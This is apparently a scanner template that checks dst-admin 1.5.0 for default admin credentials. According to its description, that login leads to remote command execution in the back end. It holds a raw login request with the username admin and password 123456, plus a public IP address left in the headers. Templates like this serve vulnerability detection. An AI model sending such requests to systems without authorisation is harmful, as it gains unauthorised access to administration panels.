id: ds-admin-default-passwd
info:
  name: ds-admin-default-passwd
  author: apple
  severity: high
  description: 存在默认密码，可以后台执行命令。具体看reference。
  reference:
    - https://github.com/4nNns/cveAdd/blob/developer/dst-admin%201.5.0%E5%90%8E%E5%8F%B0cavesConsole%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/Dst-admin%201.5.0%20background%20cavesConsole%20interface%20remote%20command%20execution.md
  tags: tags
http:
  - raw:
      - |-
        POST /login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5666.197 Safari/537.36
        Accept: */*
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest
        Content-Length: 30
        Origin: http://42.193.14.29:8080
        Connection: close
        Referer: http://42.193.14.29:8080/login
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not=A?Brand";v="24"
        sec-ch-ua-mobile: ?0

        username=admin&password=123456
    matchers:
      - type: binary
        part: body
        binary:
          - e799bbe9
